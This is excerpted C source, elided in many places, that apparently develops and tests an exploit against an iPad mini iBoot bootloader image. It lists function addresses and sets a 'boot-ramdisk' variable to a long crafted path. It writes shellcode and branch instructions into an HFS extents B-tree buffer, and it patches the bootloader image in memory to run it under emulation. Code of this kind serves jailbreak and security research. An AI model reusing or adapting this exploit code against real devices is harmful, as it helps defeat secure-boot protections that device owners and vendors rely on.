#define IMAGE_NAME              "iBoot.p107ap.RELEASE.dec" /* iPad mini */
#define IMAGE_START             0x9FF00000 
#define IMAGE_END               0x9FF535A4
#define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE         0xA3A5C 
...
#define breakpoint1_ADDR        (0x18EE4 + 1) /* ResolvePathToCatalogEntry */ 

#define fuck1_ADDR              (0x19D46 + 1) 
#define fuck2_ADDR              (0x19D5C + 1) 
#define fuck3_ADDR              (0x19E72 + 1) 
...
#define readp_ADDR              (0x19B0C + 1) 
#define get_mem_size_ADDR       (0x1F5B0 + 1) 
#define putchar_ADDR            (0x33B78 + 1) 
#define adjust_stack_ADDR       (0x1ECF8 + 1) 
#define adjust_environ_ADDR     (0x1F1F4 + 1)
#define disable_interrupts_ADDR (0x348B4 + 1) 
#define cache_stuff_ADDR        (0x22238 + 1) 
...
#define panic_ADDR              (0x20658 + 1) 
#define system_init_ADDR        (0x20744 + 1) 
#define task_create_ADDR        (0x20D74 + 1) 
#define task_start_ADDR         (0x20ED4 + 1) 
#define task_exit_ADDR          (0x20EF8 + 1) 
#define printf_ADDR             (0x333E0 + 1) 
#define malloc_ADDR             (0x19B28 + 1) 
#define free_ADDR               (0x19BDC + 1) 
#define create_envvar_ADDR      (0x1844C + 1) 
#define bcopy_ADDR              (0x33E64) 
#define decompress_lzss_ADDR    (0x25210 + 1) 
...
{
#if 1
    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/disk.dmg", 0);
#endif
}
...
if (1) {
    ...
    switch (seq) {
        ...
        case 2:
            ...
            PUT_DWORD_LE(buffer, SHELLCODE_BASE +  50 - EXTENTS_BTREE_HEADER, make_bl(0, SHELLCODE_BASE + 50, 0x20D68));
            ...
            PUT_DWORD_LE(buffer, SHELLCODE_BASE + 100 - EXTENTS_BTREE_HEADER, 0x41B68 );
            PUT_DWORD_LE(buffer, SHELLCODE_BASE + 104 - EXTENTS_BTREE_HEADER, 0x1A784 );
...
{
    eprintf("irq_disable_count = 0x%x\n", *(unsigned int *)(image + 0x557C0 + 0x18));
}
...
dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
    ...
    if (si_addr == 0) {
        if (tctx->__pc == (uintptr_t)(image + 0x20B86)) {
            /* idle task crap (read from *0) */
            tctx->__r[0] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
        if (tctx->__pc == (uintptr_t)(image + 0x20DE6)) {
...
patch_image(unsigned char *image)
{
    ...
    *(uint32_t *)(image + 0x20750) = INSN2_LDR_R1_PC__B_PLUS4; 
    *(void **)(image + 0x20754) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE); 
    /* clean data cache */
    *(uint32_t *)(image + 0x21E3C) = INSNA_RETURN; 
#if !USE_SIGNAL
    /* idle task crap (read from *0) */
    *(uint16_t *)(image + 0x20B86) = INSNT_NOP; 
    *(uint16_t *)(image + 0x20DE6) = INSNT_MOV_R_R(1, 0); 
#endif /* !USE_SIGNAL */
    /* timer 2 */
    *(uint32_t *)(image + 0x1FEFC) = INSN2_RETURN_0; 
    /* task switch FPU */
    *(uint32_t *)(image + 0x2226C) = INSNA_MOV_R2_0; 
    *(uint32_t *)(image + 0x2229C) = INSNA_MOV_R2_0; 
    /* bzero during mmu_init */
    *(uint32_t *)(image + 0x21320) = INSN2_NOP__NOP; 
    ...
    *(uint32_t *)(image + 0x026D8) = INSN2_RETURN_0;
    /* nop 0x3fa00094 */ 
    *(uint32_t *)(image + 0x02D3C) = INSN2_RETURN_0; 
    *(uint32_t *)(image + 0x02D7C) = INSN2_RETURN_0; 

    *(uint32_t *)(image + 0x00D60) = INSN2_NOP__NOP;
    *(uint16_t *)(image + 0x0C188) = INSNT_NOP; /* XXX loop */
    *(uint16_t *)(image + 0x200B6) = INSNT_NOP;
#if 0
  *(uint16_t *)(image + 0xXXXXX) = INSNT_NOP;
#endif
    *(uint32_t *)(image + 0x1F424) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F626) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F646) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F680) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F698) = INSN2_RETURN_21;
    *(uint32_t *)(image + 0x1F6B0) = INSN2_RETURN_0;
    /* nocache */
#if 0
    *(uint32_t *)(image + 0x1885C) = INSNT_RETURN;
#endif
}
